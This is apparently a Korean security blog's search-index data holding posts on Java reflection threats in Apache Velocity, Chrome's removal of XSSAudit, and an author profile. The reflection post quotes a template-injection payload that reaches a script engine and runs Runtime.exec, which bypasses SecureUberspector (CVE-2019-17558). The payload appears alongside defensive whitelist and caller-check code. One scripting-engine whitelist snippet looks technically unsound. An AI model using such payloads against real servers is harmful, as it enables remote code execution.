있습니다.\n이러한 이유로 화이트리스트 접근 방식이 일반적으로 더 효과적입니다. 화이트리스트 방식은 명시적으로 신뢰할 수 있는 클래스와 메서드만 접근을 허용하고 기본적으로 나머지를 모두 차단하므로, 승인되지 않은 메서드나 리플렉션 기반 공격을 통한 코드 실행 위험을 크게 줄일 수 있습니다.\nSecureUberspector의 역할과 한계 Apache Velocity의 SecureUberspector는 클래스 로딩과 리플렉션을 제한하는 도구로, 특히 신뢰할 수 없는 다수의 템플릿 작성자가 관여하는 경우에 유용합니다. 이는 임의의 객체 실행과 해당 객체에 대한 리플렉션을 차단하여 보안을 강화합니다. 그러나 한계가 존재합니다.\n예를 들어, CVE-2019-17558에서 SecureUberspector는 모든 리플렉션 기반 공격을 완전히 차단하지 못했습니다. 특히, javax.script.ScriptEngineManager의 사용을 막지 못해, 이를 통해 임의의 코드 실행이 가능해졌습니다. GHSL-2020-048에서는 공격자가 이 취약점을 이용하여 SecureUberspector를 우회하는 방법을 보여줍니다:\n#set($engine = $scriptEngineManager.getEngineByName(\u0026#34;nashorn\u0026#34;)) #engine.eval(\u0026#34;java.lang.Runtime.getRuntime().exec(\u0026#39;calc\u0026#39;)\u0026#34;) 이 스크립트는 SecureUberspector를 우회하여 원격 명령어 실행을 가능하게 합니다. 마찬가지로, 공격자는 SecureLayer7 분석에서 언급된 바와 같이 Groovy 스크립트를 사용해 보안 메커니즘을 우회할 수 있습니다.\n화이트리스트 적용: 구체적인 전략 화이트리스트는 신뢰할 수 있는 클래스, 메서드, 객체만 허용하고 그 외는 모두 차단하는 보안 모델로, 선호되는 방식입니다. 아래는 자바에서 화이트리스트를 적용하는 구체적인 방법들입니다.\n보안 관리자(Security Manager) 사용\n자바 보안 관리자를 사용하면 민감한 리소스에 대한 접근을 제한하고 특정 클래스나 메서드만 실행할 수 있도록 할 수 있습니다.\nSystem.setSecurityManager(new SecurityManager()); // 신뢰할 수 있는 메서드/클래스에 대한 권한 정의 PermissionCollection perms = new Permissions(); perms.add(new RuntimePermission(\u0026#34;accessDeclaredMembers\u0026#34;)); // 리플렉션 접근 허용 perms.add(new RuntimePermission(\u0026#34;createClassLoader\u0026#34;)); // 클래스 로더 생성 허용 AccessController.doPrivileged(new PrivilegedAction\u0026lt;Void\u0026gt;() { public Void run() { // 화이트리스트에 포함된 메서드 내에서만 실행 secureMethod(); return null; } }, new AccessControlContext(new ProtectionDomain[] {new ProtectionDomain(null, perms)})); 리플렉션을 통한 접근 제어\n리플렉션 사용 시, 특정 클래스와 메서드에 대한 접근을 수동으로 제한하여 명시적으로 허용되지 않은 경우 접근을 거부할 수 있습니다.\nprivate static final Set\u0026lt;String\u0026gt; allowedMethods = Set.of( \u0026#34;java.lang.String\u0026#34;, \u0026#34;java.util.List\u0026#34; // 화이트리스트에 포함된 클래스 ); public static Object invokeMethod(Method method, Object target, Object... args) throws Exception { if (!allowedMethods.contains(method.getDeclaringClass().getName())) { throw new SecurityException(\u0026#34;Unauthorized method invocation: \u0026#34; + method.getName()); } return method.invoke(target, args); // 화이트리스트에 포함된 메서드만 실행 } 스크립트 엔진에서의 화이트리스트 적용\njavax.script.ScriptEngineManager와 같은 스크립트 엔진도 화이트리스트를 구현하여 안전한 스크립트나 명령어만 실행되도록 할 수 있습니다.\nScriptEngine engine = new ScriptEngineManager().getEngineByName(\u0026#34;nashorn\u0026#34;); engine.setBindings(new SimpleBindings(allowedMethods), ScriptContext.ENGINE_SCOPE); // 화이트리스트 적용 engine.eval(\u0026#34;some safe script here\u0026#34;); 템플릿 엔진에서의 화이트리스트 적용\nSecureUberspector와 같은 도구는 템플릿 엔진 내에서 신뢰할 수 있는 메서드와 객체에 대한 접근을 제한하는 화이트리스트 방식을 강제하도록 설정할 수 있습니다.\npublic Iterator getIterator(Object obj, Info i) { if (obj != null) { SecureIntrospectorControl sic = (SecureIntrospectorControl) introspector; if (sic.checkObjectExecutePermission(obj.getClass(), null)) { return super.getIterator(obj, i); } else { log.warn(\u0026#34;보안 제한으로 인해 \u0026#34; + obj.getClass() + \u0026#34;에서 iterator를 가져올 수 없습니다.\u0026#34;); } } return null; } StackWalker를 통한 보호: 호출자 검증 Java 9에서 도입된 StackWalker API는 호출 스택을 검사하는 안전한 방법을 제공하여, 메서드 호출에 대한 더 나은 제어를 가능하게 합니다. StackWalker를 사용하면 메서드가 신뢰할 수 있는 호출자에 의해서만 호출되는지 확인할 수 있습니다.\n다음은 StackWalker를 사용하여 메서드의 호출자를 검증하는 예제입니다:\nimport java.lang.StackWalker; import java.util.List; import java.util.Set; import java.util.stream.Collectors; public class SecurityManagerUtil { // 화이트리스트에 포함된 호출자 클래스 private static final Set\u0026lt;String\u0026gt; allowedCallers = Set.of(\u0026#34;com.example.TrustedClass\u0026#34;); public static void checkCaller() { List\u0026lt;String\u0026gt; stackTrace = StackWalker.getInstance(StackWalker.Option.RETAIN_CLASS_REFERENCE) .walk(frames -\u0026gt; frames.map(frame -\u0026gt; frame.getDeclaringClass().getName()) .collect(Collectors.toList())); // 호출자가 화이트리스트에 포함되지 않은 경우 예외 발생 boolean isCallerAllowed = stackTrace.stream().anyMatch(allowedCallers::contains); if (!isCallerAllowed) { throw new SecurityException(\u0026#34;Unauthorized caller detected: \u0026#34; + stackTrace); } } public static void secureMethod() { checkCaller(); // 실행 전 호출자 검증 System.out.println(\u0026#34;Secure method executed.\u0026#34;); } } 이 예제는 신뢰할 수 있는 클래스만이 secureMethod()를 호출할 수 있도록 보장합니다. 만약 허가되지 않은 클래스가 메서드에 접근하려 할 경우, 예외가 발생합니다.\n결론: 리플렉션의 올바른 사용과 보호 자바 리플렉션 API는 유연하고 강력한 도구이지만, 특히 Velocity와 같은 템플릿 엔진과 결합될 경우 심각한 보안 위험을 초래합니다. 블랙리스트 기반 접근 방식은 우회될 가능성이 높지만, 화이트리스트 방식은 신뢰할 수 있는 요소만 실행되도록 하여 더 강력한 보호를 제공합니다. 또한, StackWalker API를 활용하면 메서드 호출을 검증하고 무단 접근을 차단하여 보안을 한층 강화할 수 있습니다.\n화이트리스트와 StackWalker와 같은 도구를 결합함으로써, 자바 애플리케이션을 리플렉션 기반 공격에 대해 더욱 안전하고 견고하게 만들 수 있습니다.\n","permalink":"https://windshock.github.io/ko/post/2019-09-03-security-threats-and-mitigation-strategies-for-java-reflection/","summary":"\u003ch3 id=\"자바-리플렉션의-보안-위협과-완화-전략\"\u003e자바 리플렉션의 보안 위협과 완화 전략\u003c/h3\u003e\n\u003cp\u003e\u003cstrong\u003e자바 리플렉션 API\u003c/strong\u003e는 런타임에 클래스, 메서드, 인터페이스를 동적으로 조작할 수 있게 해주는 강력한 도구입니다. 하지만 그 유연성 때문에 공격자가 이를 악용해 시스템에 무단 접근할 수 있는 심각한 보안 위험이 발생합니다. 본 문서에서는 자바 리플렉션이 야기하는 보안 위협을 살펴보고, 이러한 위험을 완화하기 위한 전략들을 설명합니다.\u003c/p\u003e\n\u003ch4 id=\"리플렉션-api-사용-시의-위험성\"\u003e리플렉션 API 사용 시의 위험성\u003c/h4\u003e\n\u003cp\u003e리플렉션은 객체의 구조를 검사하거나 런타임에 메서드를 동적으로 호출하는 데 일반적으로 사용됩니다. 그러나 적절한 **보안 관리자(Security Manager)**가 없는 경우, \u003ccode\u003eexecute\u003c/code\u003e, \u003ccode\u003eeval\u003c/code\u003e 등과 같은 민감한 메서드에 접근할 수 있어 잠재적인 \u003cstrong\u003e원격 코드 실행(RCE)\u003c/strong\u003e 공격을 유발할 수 있습니다.\u003c/p\u003e","title":"자바 리플렉션의 보안 위협과 완화 전략"},{"content":"Chrome에서 XSSAudit 기능이 제거하는 이유? Google 보안팀에서는 Chrome 개발팀에게 XSSAudit 기능을 제거하자는 제안을 했지만, Google 보안팀이 제시한 근거는 우회 가능하다는 내용( evn@google.com의 논문)뿐이라 제거까지 가지 않을 것 같았지만, Chrome version 에서는 완전히 제외되는 것으로 결정되었습니다.\n논문의 주요 내용은 신규 javascript framework의 garget을 이용한 우회 방법은 방어하기 어려우므로, 기존 완화하는 방법(xssaudit filter)에서 격리/예방하는 방법(Content Security Policy, 이하 CSP)으로 변화하자는 것이 주요 내용입니다.\nXSSAudit은 유용하지 않았던가? Google과 같은 업체 입장에서는 XSSAudit 기능에 의해 유지 비용이 소모되고 경쟁 업체(MS 등) 브라우저보다 성능이 느려진다면, 이 기능은 제거하고 싶은 것이 당연할 겁니다. (실제로 MS EDGE에서 해당 기능을 제거하였습니다.)\n모의해커 등 공격자 입장에서는 매우 비정상적인 상황에서만 XSSAudit 우회가 가능하므로 해당 기능을 매우 귀찮고 성가신 존재입니다.\n보안 담당자 등 방어자 입장에서는 적용하기 어려운 CSP를 도입해야 하므로 업무적으로 피곤하게 됩니다. 또한 CSP도 완벽한 방어 방법은 아닙니다. # Content Security Policy Level 2 RFP의 내용에서도 CSP는 방어를 강화하는 한가지 방식으로 기술하고 있습니다.\nContent Security Policy (CSP) is not intended as a first line of defense against content injection vulnerabilities. Instead, CSP is best used as defense-in-depth, to reduce the harm caused by content injection attacks. As a first line of defense against content injection, server operators should validate their input and encode their output.\n구글 등 브라우저 개발사 외에는 모두 유용했던 기능인데 제거하려는 이유가 우회된다는 것 뿐이라면, 업체 중심적인 의사 결정으로 보입니다. Google은 Don\u0026rsquo;t be evil, Do the right thing 아니었나요?\n어떻게 되었든 CSP 도입으로 공부를 많이 해야 합니다. ㅠㅠ How do I Content Security Policy So we broke all CSPs …\n","permalink":"https://windshock.github.io/ko/post/2019-08-08-about-the-xssaudit/","summary":"\u003ch2 id=\"chrome에서-xssaudit-기능이-제거하는-이유\"\u003eChrome에서 XSSAudit 기능이 제거하는 이유?\u003c/h2\u003e\n\u003cp\u003eGoogle 보안팀에서는 Chrome 개발팀에게 \u003ca href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=898081\"\u003eXSSAudit 기능을 제거하자는 제안\u003c/a\u003e을 했지만, Google 보안팀이 제시한 근거는 우회 가능하다는 내용( \u003ca href=\"mailto:evn@google.com\"\u003eevn@google.com\u003c/a\u003e의 논문)뿐이라 제거까지 가지 않을 것 같았지만, \u003ca href=\"https://groups.google.com/a/chromium.org/forum/#!msg/blink-dev/TuYw-EZhO9g/blGViehIAwAJ\"\u003eChrome version 에서는 완전히 제외\u003c/a\u003e되는 것으로 결정되었습니다.\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"/pdf/p1709-lekiesA.pdf\"\u003e논문\u003c/a\u003e의 주요 내용은 신규 javascript framework의 garget을 이용한 우회 방법은 방어하기 어려우므로, 기존 완화하는 방법(xssaudit filter)에서  격리/예방하는 방법(Content Security Policy, 이하 CSP)으로 변화하자는 것이 주요 내용입니다.\u003c/p\u003e\n\u003ch2 id=\"xssaudit은-유용하지-않았던가\"\u003eXSSAudit은 유용하지 않았던가?\u003c/h2\u003e\n\u003cp\u003eGoogle과 같은 업체 입장에서는 XSSAudit 기능에 의해 유지 비용이 소모되고 경쟁 업체(MS 등) 브라우저보다 성능이 느려진다면, 이 기능은 제거하고 싶은 것이 당연할 겁니다. (실제로 MS EDGE에서 해당 기능을 제거하였습니다.)\u003c/p\u003e","title":"About the XSSAudit"},{"content":"🚀 보안 취약점 분석가 및 보안 자동화 전문가 🚀\n17년 이상의 경험을 바탕으로 취약점 분석, 안전한 코딩, 자동화된 보안 솔루션 구축에 집중하고 있습니다. 제 작업은 조직이 보안 문제를 더 빠르고 효과적으로 해결할 수 있도록 코드화된 보안 솔루션을 제공하는 데 중점을 둡니다. 주요 보안 원칙을 따르며, 개발 과정 초기에 보안을 통합하는 시프트-레프트 접근 방식을 강조하고, 데이터 기반 보안을 활용하여 더 스마트한 시스템을 구축합니다.\n🔑 시프트-레프트 - 개발자 및 이해관계자를 위한 안전한 코딩 지침: 보안은 개발 과정 초기에 통합되어야 합니다. 이를 위해 개발자와 비즈니스 이해관계자를 대상으로 한 안전한 코딩 지침을 제공하여 취약점을 즉시 해결할 수 있도록 지원합니다. 이러한 지침은 개발 초기 단계부터 보안을 강화하여 시프트-레프트 접근 방식을 촉진합니다.\n🔑 보안 자동화 - 자동화된 보안 솔루션 구축: 오늘날의 개발 환경에서 보안 자동화는 필수적입니다. DevSecOps 환경 내에서 자동화된 보안 솔루션을 구축하여 개발 파이프라인에 보안을 원활하게 통합했습니다. 자동화된 악성코드 탐지 및 보안 로그 분석을 통해 수작업을 크게 줄이고 보안 위협에 대한 대응 시간을 최소화했습니다.\n🔑 데이터 기반 보안 - Fortify를 활용한 취약점 클러스터링 및 이상 트래픽 분석: 데이터 기반 보안에 집중하여 Fortify를 사용한 취약점 클러스터링 및 이상 트래픽 분석 도구를 개발했습니다. 이러한 도구는 보안 취약점에 대한 더 빠르고 체계적인 분석과 대응을 가능하게 하여 다양한 환경에서 보안 문제를 사전에 예방합니다.\n🔑 재능 기부 - CVE, CWE 보고 및 GitHub 도구 공유: 보안 커뮤니티에 적극 기여하며 CVE 및 CWE 취약점을 보고합니다. 또한 이러한 취약점을 해결하기 위한 도구를 개발하여 GitHub에 공유합니다. 이러한 재능 기부는 글로벌 보안 생태계를 강화하고 조직이 중요한 보안 문제를 해결하는 데 도움을 줍니다.\n📧 Email: windshock@gmail.com\n🔗 Website: https://windshock.github.io/\n💼 LinkedIn: https://www.linkedin.com/in/windshock/\n","permalink":"https://windshock.github.io/ko/about/","summary":"보안 자동화와 취약점 분석 전문가입니다.","title":"소개"}]